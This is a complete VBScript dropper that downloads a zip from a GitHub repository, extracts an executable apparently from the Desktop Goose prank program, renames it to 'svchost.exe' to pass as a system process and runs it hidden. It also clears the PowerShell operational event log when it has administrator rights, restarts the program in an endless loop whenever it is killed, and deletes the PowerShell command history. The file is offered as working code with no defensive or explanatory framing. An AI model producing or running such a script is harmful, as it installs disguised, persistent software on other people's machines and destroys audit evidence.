Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
zipPath = tempPath & "\IGoose.zip"
extractPath = tempPath & "\IGooseExtracted"
exePath = extractPath & "\svchost.exe"

url = "https://github.com/Akeydeys/In/raw/main/BASIC%20STEALTHY%20IGOOSE.ps1"

' Download the zip
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://github.com/Akeydeys/In/raw/main/Birth%20Goose.zip", False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile zipPath, 2
    stream.Close
End If

' Extract the zip
Set shellApp = CreateObject("Shell.Application")
shellApp.NameSpace(extractPath).CopyHere shellApp.NameSpace(zipPath).Items

' Rename the executable
WScript.Sleep 3000 ' Wait for extraction
originalExe = extractPath & "\GooseDesktop.exe"
If fso.FileExists(originalExe) Then
    fso.MoveFile originalExe, exePath
End If

' Start the process
shell.Run """" & exePath & """", 0, False

' One-time log cleanup
On Error Resume Next
shell.Run "powershell -Command ""try { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) { wevtutil cl 'Microsoft-Windows-PowerShell/Operational' } } catch {}""", 0, False

' Keep checking if process dies, then restart and clean history
Do
    WScript.Sleep 3000
    Set processes = GetObject("winmgmts:").ExecQuery("Select * from Win32_Process Where Name='svchost.exe'")
    found = False
    For Each p In processes
        If InStr(p.CommandLine, "IGooseExtracted") > 0 Then
            found = True
            Exit For
        End If
    Next

    If Not found Then
        shell.Run """" & exePath & """", 0, False
        ' Clear history
        shell.Run "powershell -Command ""try { Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue } catch {}""", 0, False
        shell.Run "powershell -Command ""try { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) { wevtutil cl 'Microsoft-Windows-PowerShell/Operational' } } catch {}""", 0, False
    End If
Loop
